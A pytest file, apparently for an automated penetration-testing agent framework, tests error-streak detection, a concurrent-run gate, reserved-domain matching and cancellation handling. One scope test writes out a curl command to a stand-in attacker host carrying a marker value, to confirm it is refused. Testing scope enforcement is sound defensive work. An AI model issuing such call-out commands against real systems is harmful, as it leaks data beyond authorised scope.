"""复评修复轮：平台报错指纹 / 双开闸门 / 保留域 / 前台信号收尾。"""

from __future__ import annotations

import os
import socket

import pytest


class TestPlatformErrorFingerprint:
    """P0：平台 JSON 形态报错（{"error": 409...}）纳入同类报错检测。"""

    def test_json_409_triggers_same_error_streak(self):
        from secpt.runtime.stuck import StuckDetector

        det = StuckDetector(threshold=999)  # 隔离 no_progress 路径
        out = (
            '{"error": 409, "body": "{\\"code\\":\\"invalid_state\\",'
            '\\"message\\":\\"max active challenge instances reached (3), '
            'please close an existing challenge\\"}"}'
        )
        for _ in range(3):
            det.update(out)
        assert det.should_nudge() is True  # 旧口径（只认 Error: 前缀）完全抓不到
        assert "同一类报错" in det.nudge()

    def test_json_error_fingerprint_stable(self):
        from secpt.runtime.stuck import StuckDetector

        a = StuckDetector._error_fingerprint('{"error": 500, "body": "internal server error"}')
        b = StuckDetector._error_fingerprint('{"error": 500, "body": "internal server error"}')
        assert a and a == b

    def test_plain_error_still_detected(self):
        from secpt.runtime.stuck import StuckDetector

        det = StuckDetector(threshold=999)
        for _ in range(3):
            det.update("Error: connection refused")
        assert det.should_nudge() is True  # 旧路径不受影响


class TestConcurrentRunGate:
    """P1a：同任务双开闸门（其他存活 worker 持活跃租约 → 快速失败）。"""

    def _mk_ledger(self, tmp_path, worker_id):
        from secpt.core.orchestrator.ledger import ChallengeLedger

        return ChallengeLedger(tmp_path / "b.sqlite", worker_id=worker_id)

    def test_active_foreign_detected_and_dead_filtered(self, tmp_path):
        host = socket.gethostname()
        alive = self._mk_ledger(tmp_path, f"1@{host}")  # pid 1 必在（PermissionError→存活）
        alive.ensure("g-01")
        assert alive.claim("g-01") is True
        me = self._mk_ledger(tmp_path, f"{os.getpid()}@{host}")
        assert me.active_foreign_leases() == ["g-01"]  # 存活的外来租约被发现
        # 死进程（不可能的 pid）残留租约被过滤（不阻塞重启，无需等 15min TTL）
        dead = self._mk_ledger(tmp_path, f"99999999@{host}")
        dead.ensure("g-02")
        assert dead.claim("g-02") is True
        assert "g-02" not in me.active_foreign_leases()
        # 自己的租约不算外来
        me2 = self._mk_ledger(tmp_path, f"{os.getpid()}@{host}")
        me2.ensure("g-03")
        me2.claim("g-03")
        assert "g-03" not in me2.active_foreign_leases()

    def test_run_benchmark_refuses_when_active_foreign(self, tmp_path, monkeypatch):
        from secpt.core.orchestrator import benchmark as B

        monkeypatch.setenv("SECPT_VAR", str(tmp_path))
        monkeypatch.delenv("SECPT_BENCHMARK_FORCE", raising=False)
        host = socket.gethostname()
        other = self._mk_ledger(tmp_path, f"1@{host}")
        other.ensure("g-01")
        other.claim("g-01")

        from secpt.core.job.models import TaskSpec

        spec = TaskSpec(job_id="bm1", task_type="benchmark", objective="跑分")
        with pytest.raises(B.BenchmarkUnavailable) as ei:
            import asyncio

            asyncio.run(
                B.run_benchmark(spec, ledger=self._mk_ledger(tmp_path, f"{os.getpid()}@{host}"))
            )
        assert "已有活跃 run" in str(ei.value) and "SECPT_BENCHMARK_FORCE" in str(ei.value)

    def test_force_env_bypasses_gate(self, tmp_path, monkeypatch):
        from secpt.core.orchestrator import benchmark as B

        monkeypatch.setenv("SECPT_VAR", str(tmp_path))
        monkeypatch.setenv("SECPT_BENCHMARK_FORCE", "1")
        host = socket.gethostname()
        other = self._mk_ledger(tmp_path, f"1@{host}")
        other.ensure("g-01")
        other.claim("g-01")
        # 强制模式：闸门放行（后续 fetch 失败于缺 env，但那是另一层——用假 fetch 短路）
        monkeypatch.setattr(B, "fetch_challenges", lambda: [])
        import asyncio

        from secpt.core.job.models import TaskSpec

        spec = TaskSpec(job_id="bm2", task_type="benchmark", objective="跑分")
        summary = asyncio.run(
            B.run_benchmark(spec, ledger=self._mk_ledger(tmp_path, f"{os.getpid()}@{host}"))
        )
        assert summary["mode"] == "benchmark"  # 放行后正常走完空题路径


class TestReservedDomain:
    """P1b：保留域判定 + scope 拒绝专属提示。"""

    def test_reserved_matcher(self):
        from secpt.runtime.engine import is_reserved_target

        for t in ("evil.example", "example.com", "x.test", "foo.invalid", "localhost"):
            assert is_reserved_target(t), t
        for t in ("10.0.100.58", "shop.example.com.cn", "evil.example.org.cn"):
            assert not is_reserved_target(t), t

    def test_scope_denial_message_mentions_canary(self, tmp_path):
        from secpt.governance.scope import ScopeValidator
        from secpt.runtime.engine import RunConfig, _scope_check

        cfg = RunConfig(
            job_id="rf",
            objective="t",
            system_extra="",
            workspace=tmp_path,
            bash_whitelist=frozenset({"curl"}),
        )
        cfg.scope = ScopeValidator(["10.0.0.0/8"])
        err = _scope_check(cfg, "curl -s http://evil.example/p?m=SECPT-abc")
        assert err and "保留域" in err and "container_addr" in err  # 金丝雀专属提示


class TestCancelHandler:
    """P2：前台信号收尾（落盘 cancelled + 退出码 130）。"""

    def test_handler_writes_event_and_exits(self, tmp_path, monkeypatch):
        monkeypatch.setenv("SECPT_VAR", str(tmp_path))
        from secpt.cli.solve import _make_cancel_handler

        h = _make_cancel_handler("cx1")
        with pytest.raises(SystemExit) as ei:
            h(15, None)
        assert ei.value.code == 130
        ev = (tmp_path / "jobs" / "cx1" / "events.jsonl").read_text(encoding="utf-8")
        assert '"status_change"' in ev and '"cancelled"' in ev  # 无痕直死 → 有痕落盘
